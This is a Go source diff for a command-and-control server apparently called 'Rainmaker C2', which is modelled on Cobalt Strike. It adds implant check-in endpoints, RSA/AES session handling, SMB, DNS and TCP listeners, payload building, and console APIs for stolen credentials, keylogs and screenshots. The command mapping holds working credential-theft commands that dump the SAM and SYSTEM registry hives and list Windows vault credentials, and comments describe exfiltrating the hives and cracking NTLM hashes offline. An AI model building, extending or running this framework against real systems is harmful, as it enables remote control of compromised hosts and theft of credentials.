@@ -29,10 +29,13 @@ import (
 	"log"
 	"net/http"
 	"os"
+	"path/filepath"
 	"strconv"
 	"strings"
 	"sync"
 	"time"
+
+	"csdev/proto"
 )
 
 //go:embed ui.html
@@ -308,6 +311,11 @@ func mapCommand(cmd string) string {
 	case "history":
 		return `powershell -c "Get-Content (Get-PSReadlineOption).HistorySavePath"`
 	case "sam", "hashdump":
+		// 仅 v1 (legacy) 会话会走到这里。
+		// v2 会话的 hashdump 在 v2SendCommand 里就被 isHashdumpCommand 拦下,
+		// 改走"导出 -> 分块回传 hive -> 服务端离线解析出 NTLM"的完整链路
+		// (见 v2_hashdump.go)。v1 没有分块回传通道, 所以这里保留原行为:
+		// 只把 hive 落到目标机 %TEMP% 并列出, 不做解析。
 		return `reg save HKLM\SAM %TEMP%\s.hiv /y & reg save HKLM\SYSTEM %TEMP%\y.hiv /y & dir %TEMP%\*.hiv`
 	case "vault":
 		return `vaultcmd /listcreds:"Windows Credentials" /all`
@@ -568,27 +576,15 @@ func handleResult(w http.ResponseWriter, r *http.Request) {
 
 // ---------------------------------------------------------------- Web API
 func handleSessions(w http.ResponseWriter, r *http.Request) {
-	now := time.Now().Unix()
-	list := st.list()
-	type row struct {
-		SID     string `json:"sid"`
-		Host    string `json:"host"`
-		User    string `json:"user"`
-		Arch    string `json:"arch"`
-		Addr    string `json:"addr"`
-		Idle    int64  `json:"idle"`
-		HasTask bool   `json:"has_task"`
-	}
-	out := []row{}
-	for _, s := range list {
-		out = append(out, row{s.ID, s.Host, s.User, s.Arch, s.Addr, now - s.Last, s.HasTask})
-	}
-	writeJSON(w, map[string]interface{}{"ok": true, "sessions": out})
+	writeJSON(w, map[string]interface{}{"ok": true, "sessions": sessionsRows()})
 }
 
 func handleOutput(w http.ResponseWriter, r *http.Request) {
 	sid := r.URL.Query().Get("sid")
 	since, _ := strconv.ParseInt(r.URL.Query().Get("since"), 10, 64)
+	if v2TryOutput(w, sid, since) {
+		return
+	}
 	st.mu.RLock()
 	s := st.byID[sid]
 	st.mu.RUnlock()
@@ -606,6 +602,17 @@ func handleCommand(w http.ResponseWriter, r *http.Request) {
 	}
 	if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
 		writeJSON(w, map[string]interface{}{"ok": false, "error": "bad json"})
+		return
+	}
+	// Aggressor 风格脚本命令优先 (只拦截脚本注册过的命令名)
+	if scriptTryCommand(w, req.SID, req.Cmd) {
+		return
+	}
+	// 服务端侧作业命令 (jobs / jobkill)
+	if jobTryCommand(w, req.SID, req.Cmd) {
+		return
+	}
+	if v2TryCommand(w, req.SID, req.Cmd) {
 		return
 	}
 	st.mu.RLock()
@@ -640,39 +647,269 @@ func handleUI(w http.ResponseWriter, r *http.Request) {
 }
 
 // ---------------------------------------------------------------- main
+// consoleRoute 一个需要操作员令牌的控制台接口。
+type consoleRoute struct {
+	path string
+	h    http.HandlerFunc
+}
+
+// consoleRoutes 控制台接口清单 —— 这里的每一条都会被套上 requireAuth。
+//
+// 为什么要把清单提出来集中管理: 这些端点会吐出会话列表、凭据、键盘记录、截屏、
+// 下载文件、目标库整个数据集, 也能下发命令 / 生成载荷 / 起监听器 / 终止全部会话。
+// 之前它们是逐条裸注册的, 默认的 -auth=on 根本拦不住 —— 未登录也能全部拉到,
+// 是个真缺口。集中成一份清单以后, 测试可以遍历它做"未登录一律 401"的反向断言,
+// 以后新增接口忘了套认证会直接测失败。
+//
+// **植入体通道绝不能进这张表**: /submit /report /task /result 以及 profile 声明的
+// URI 池走的是植入体自己的 RSA/AES 会话密钥, 手里没有操作员令牌, 套上 requireAuth
+// 等于所有植入体一起掉线。
+//
+// 旁路模式 (-auth=off) 下 requireAuth 内部直接放行 (AuthEnabled()==false),
+// 单机调试体验完全不变; 只有默认的 -auth=on 才真正要求令牌。
+var consoleRoutes = []consoleRoute{
+	{"/api/state", handleState},
+	{"/api/scripts", handleScripts},
+	{"/api/jobs", handleJobs},
+	{"/api/plugins", handlePlugins},
+	{"/api/plugin/set", handlePluginSet},
+	{"/api/script/run", handleScriptRun},
+	{"/api/script/menu", handleScriptMenu},
+	{"/api/sessions", handleSessions},
+	{"/api/output", handleOutput},
+	{"/api/command", handleCommand},
+	{"/api/session/info", handleSessionInfo},
+	{"/api/session/sleep", handleSessionSleep},
+	{"/api/session/exit", handleSessionExit},
+	{"/api/session/checkin", handleSessionCheckin},
+	{"/api/credentials", handleCredentials},
+	{"/api/downloads", handleDownloads},
+	{"/api/download/file", handleDownloadFile},
+	{"/api/screenshots", handleScreenshots},
+	{"/api/screenshot/file", handleScreenshotFile},
+	{"/api/keylogs", handleKeylogs},
+	{"/api/eventlog", handleEventlog},
+	{"/api/listeners", handleListeners},
+	{"/api/listener/add", handleListenerAdd},
+	{"/api/listener/remove", handleListenerRemove},
+	{"/api/listeners/selftest", func(w http.ResponseWriter, r *http.Request) {
+		writeJSON(w, listenerSelfCheck())
+	}},
+	{"/api/payload/formats", handlePayloadFormats},
+	{"/api/payload/build", handlePayloadBuild},
+	{"/api/killall", handleKillAll},
+	{"/api/targets", handleTargets},
+	{"/api/targets/csv", handleTargetsCSV},
+}
+
+// registerConsoleRoutes 把 consoleRoutes 全部注册到 mux, 逐条套 requireAuth。
+func registerConsoleRoutes(mux *http.ServeMux) {
+	for _, c := range consoleRoutes {
+		mux.HandleFunc(c.path, requireAuth(c.h))
+	}
+}
+
 func main() {
 	host := flag.String("host", "0.0.0.0", "监听地址")
 	port := flag.Int("port", 8443, "监听端口")
+	emitPub := flag.String("emit-pubkey", "", "导出植入体公钥 C 头文件到指定路径后退出")
+	showKey := flag.Bool("show-key", false, "打印公钥指纹后退出")
+	profilePath := flag.String("profile", "", "Malleable C2 profile 路径 (留空则自动探测 profiles/csdev.profile)")
+	tcpAddr := flag.String("tcp", "", "额外启用 TCP reverse listener, 格式 ip:port (如 0.0.0.0:8444)")
+	smbPipe := flag.String("smb", "", "额外启用 SMB 命名管道 listener, 如 \\\\.\\pipe\\csdev_pipe")
+	scriptFlag := flag.String("scripts", "", "附加加载的 Aggressor 风格脚本 (.cna), 逗号分隔")
+	pluginDir := flag.String("plugins-dir", "", "可选插件包目录(在 GUI/API 里挑选加载), 例如 CS 的 plugin 目录")
+	pluginSel := flag.String("plugin", "", "启动时加载的插件包(目录或 .cna 文件), 逗号分隔; 覆盖已保存的选择")
+	dnsAddr := flag.String("dns", "", "额外启用 DNS listener, 如 0.0.0.0:5353 (生产用 53 需特权)")
+	extc2Addr := flag.String("extc2", "", "额外启用 External C2 listener (第三方中转接入点), 如 0.0.0.0:9100")
+	tlsFlag := flag.Bool("tls", false, "主 listener 改用 HTTPS (自签名证书, 首次启动自动生成到 data/)")
 	flag.Parse()
 
+	addr := fmt.Sprintf("%s:%d", *host, *port)
+	serverAddr = addr
+
+	// 路径与存储初始化
+	devRoot = findDevRoot()
+	dataDir = filepath.Join(devRoot, "data")
+	downloadDir = filepath.Join(devRoot, "downloads")
+	screenshotDir = filepath.Join(devRoot, "screenshots")
+	storeFile = filepath.Join(dataDir, "store.jsonl")
+	_ = os.MkdirAll(dataDir, 0o755)
+	storeLoad()
+
+	// Aggressor 风格脚本运行时
+	//   scripts/*.cna 始终加载(自研脚本) + --scripts 附加 + 选中的插件包(data/plugins.json)
+	{
+		extra := []string{}
+		if *scriptFlag != "" {
+			for _, p := range strings.Split(*scriptFlag, ",") {
+				p = strings.TrimSpace(p)
+				if p != "" {
+					extra = append(extra, p)
+				}
+			}
+		}
+		if *pluginDir != "" {
+			// 只设置根目录: 不要在这里 save, 否则会把还没读回来的
+			// 已选集合(pluginLoadState 还没跑)写成空数组, 覆盖持久化文件。
+			pluginSetRoot(*pluginDir)
+		}
+		if *pluginSel != "" {
+			var paths []string
+			for _, p := range strings.Split(*pluginSel, ",") {
+				p = strings.TrimSpace(p)
+				if p != "" {
+					paths = append(paths, p)
+				}
+			}
+			pluginState.mu.Lock()
+			pluginState.selected = paths
+			pluginState.mu.Unlock()
+			pluginSaveState()
+		}
+		initAggressor(extra)
+	}
+
+	// RSA 密钥对 (首次运行自动生成)
+	if err := proto.GenerateKeypair(dataDir); err != nil {
+		logf("[!] 密钥对生成失败: %v", err)
+	}
+	priv, err := proto.LoadKeypair(dataDir)
+	if err != nil {
+		fmt.Fprintln(os.Stderr, "加载密钥失败:", err)
+		os.Exit(1)
+	}
+	pubBlob := proto.PublicKeyBlob(&priv.PublicKey)
+
+	if *showKey {
+		fmt.Printf("公钥指纹: %s\n", pubkeyFingerprint(pubBlob))
+		fmt.Printf("PUBLICKEYBLOB: %d 字节\n", len(pubBlob))
+		return
+	}
+	if *emitPub != "" {
+		if err := proto.EmitPubkeyHeader(*emitPub, pubBlob); err != nil {
+			fmt.Fprintln(os.Stderr, "导出失败:", err)
+			os.Exit(1)
+		}
+		fmt.Printf("已导出公钥头文件: %s (%d 字节)\n", *emitPub, len(pubBlob))
+		return
+	}
+
+	vl := &VPListener{Priv: priv, Name: "csdev-v2", Addr: addr}
+
+	// Malleable profile: 决定植入体入口路径与应答头
+	{
+		p := *profilePath
+		if p == "" {
+			auto := filepath.Join(devRoot, "profiles", "csdev.profile")
+			if _, err := os.Stat(auto); err == nil {
+				p = auto
+			}
+		}
+		if p != "" {
+			if err := loadProfileFile(p); err != nil {
+				logf("[!] profile 加载失败: %v (回落到默认 /submit)", err)
+			}
+		}
+	}
+
+	registerMainListener("csdev-v2", pickType(*port), "v2", *host, *port, "/submit", *tlsFlag)
+	registerMainListener("csdev-legacy", pickType(*port), "v1", *host, *port, "/report", *tlsFlag)
 
 	mux := http.NewServeMux()
-	mux.HandleFunc("/report", handleReport)
+
+	// ---- 植入体接口 ----
+	mux.HandleFunc("/submit", vl.handleSubmit) // v2 统一入口
+	mux.HandleFunc("/report", handleReport)    // v1 legacy
 	mux.HandleFunc("/task", handleTask)
 	mux.HandleFunc("/result", handleResult)
-	mux.HandleFunc("/api/sessions", handleSessions)
-	mux.HandleFunc("/api/output", handleOutput)
-	mux.HandleFunc("/api/command", handleCommand)
+	// profile 声明的附加入口 (URI 池)
+	for _, u := range profileURIs() {
+		if u == "/submit" || u == "/" {
+			continue
+		}
+		mux.HandleFunc(u, vl.handleSubmit)
+		logf("  profile 入口: %s", u)
+	}
+
+	// ---- 控制台 API ----
+	// 统一走 registerConsoleRoutes 套 requireAuth。清单在 consoleRoutes, 说明也在那里。
+	registerConsoleRoutes(mux)
+	// 认证与报告的路由此前只在单元测试里注册过, main 里漏接线 —— 补上。
+	// 注意: RegisterAuthRoutes 只注册 /api/login|logout|users, 不会给既有端点加保护;
+	// 需要保护时用 requireAuth 包装 (见 auth.go 顶部说明)。
+	RegisterAuthRoutes(mux)
+	RegisterReportRoutes(mux)
+	RegisterProxyRoutes(mux)
 	mux.HandleFunc("/", handleUI)
 
-	addr := fmt.Sprintf("%s:%d", *host, *port)
-	logf("csdev C2 服务端 (Go)")
+	logf("Rainmaker C2 服务端 (Go)  —  协议 v1(legacy) + v2(RSA/AES/HMAC)")
 	logf("  Web UI : http://%s/", func() string {
 		if *host == "0.0.0.0" {
 			return fmt.Sprintf("127.0.0.1:%d", *port)
 		}
 		return addr
 	}())
-	logf("  植入体 : http://%s/  (protocol KBRK)", addr)
-	logf("  密钥   : %x", sessionKey)
+	logf("  v2 入口: http://%s/submit", addr)
+	logf("  v1 入口: http://%s/report", addr)
+
+	// 可选承载层 (--tcp/--smb/--dns/--extc2)
+	// 与 REST 的 /api/listener/add 走**同一条注册路径** (listener_admin.go),
+	// 因此它们同样出现在 /api/listeners 里, 也能被 /api/listener/remove 删除。
+	listenerPriv = priv
+	for _, f := range []struct{ kind, spec string }{
+		{"tcp", *tcpAddr},
+		{"smb", *smbPipe},
+		{"dns", *dnsAddr},
+		{"extc2", *extc2Addr},
+	} {
+		if err := addFromFlag(f.kind, f.spec); err != nil {
+			logf("[!] %s listener 启动失败: %v", strings.ToUpper(f.kind), err)
+		}
+	}
+	logf("  公钥指纹: %s", pubkeyFingerprint(pubBlob))
+	logf("  v1 RC4 : %x", sessionKey)
 
 	srv := &http.Server{
 		Addr:              addr,
 		Handler:           mux,
 		ReadHeaderTimeout: 10 * time.Second,
 	}
+
+	// 主入口 (控制台) 在启动期固化: mux / profile URI 池 / TLS 证书都在这里确定,
+	// 所以 HTTP(S) **不提供**运行期新增 (见 listener_admin.go 的 kind=http 分支)。
+	if *tlsFlag {
+		certPath, keyPath, cerr := ensureSelfSignedCert(dataDir)
+		if cerr != nil {
+			logf("[!] TLS 证书准备失败, 回退 HTTP: %v", cerr)
+			if err := srv.ListenAndServe(); err != nil {
+				logf("[!] 主 listener 启动失败: %v", err)
+				fmt.Fprintln(os.Stderr, "启动失败:", err)
+				os.Exit(1)
+			}
+			return
+		}
+		logf("  HTTPS 入口: https://%s/submit  (植入体需 -DC2_SSL=1)", addr)
+		logf("  运行期可用 POST /api/listener/add 增删 tcp/smb/dns/extc2 承载 listener")
+		if err := srv.ListenAndServeTLS(certPath, keyPath); err != nil {
+			logf("[!] 主 listener 启动失败: %v", err)
+			fmt.Fprintln(os.Stderr, "启动失败:", err)
+			os.Exit(1)
+		}
+		return
+	}
+
+	logf("  运行期可用 POST /api/listener/add 增删 tcp/smb/dns/extc2 承载 listener")
 	if err := srv.ListenAndServe(); err != nil {
+		logf("[!] 主 listener 启动失败: %v", err)
 		fmt.Fprintln(os.Stderr, "启动失败:", err)
 		os.Exit(1)
 	}
+}
+
+func pickType(port int) string {
+	if port == 443 || port == 8443 {
+		return "https"
+	}
+	return "http"
 }
